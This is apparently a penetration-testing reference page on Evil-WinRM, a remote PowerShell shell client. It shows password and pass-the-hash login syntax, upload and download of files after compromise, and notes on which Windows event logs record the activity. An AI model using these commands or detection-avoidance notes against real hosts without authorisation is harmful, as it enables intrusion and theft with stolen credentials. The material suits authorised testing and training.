# Evil-WinRM

Evil-WinRM is the go-to client for interactive shell access over Windows Remote Management (WinRM), the protocol behind PowerShell Remoting. Once you have valid credentials (password or NTLM hash) for an account allowed to WinRM into a host, it gives you a full interactive PowerShell-like session.

## Common Use Cases

* Interactive shell access after obtaining valid domain/local credentials
* Uploading/downloading files during post-exploitation
* Loading PowerShell scripts and .NET assemblies into memory without touching disk
* A quieter alternative to PsExec-style tools since it uses a legitimate admin protocol (WinRM, port 5985/5986)

## Core Syntax

```
# Password auth
evil-winrm -i 10.10.10.10 -u administrator -p 'Password123!'

# Pass-the-hash
evil-winrm -i 10.10.10.10 -u administrator -H <NTLM hash>
```

Once connected:

```
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> upload /path/to/local/file.exe C:\Users\Public\file.exe
*Evil-WinRM* PS> download C:\Users\victim\Desktop\flag.txt
```

{% hint style="info" %}
WinRM is disabled by default on workstations but commonly enabled on servers. Check for it with a port scan on 5985/5986 before assuming it's available.
{% endhint %}

{% hint style="warning" %}
WinRM logons register as Event ID 4624 (Logon Type 3), and PowerShell operational logs (4103/4104) can capture commands run in the session if script block logging is enabled. This is quieter than dropping an executable, but not invisible.
{% endhint %}

## Related

* CrackMapExec / NetExec — to confirm which hosts/accounts allow WinRM before connecting
* Metasploit — alternative payload delivery if WinRM isn't available
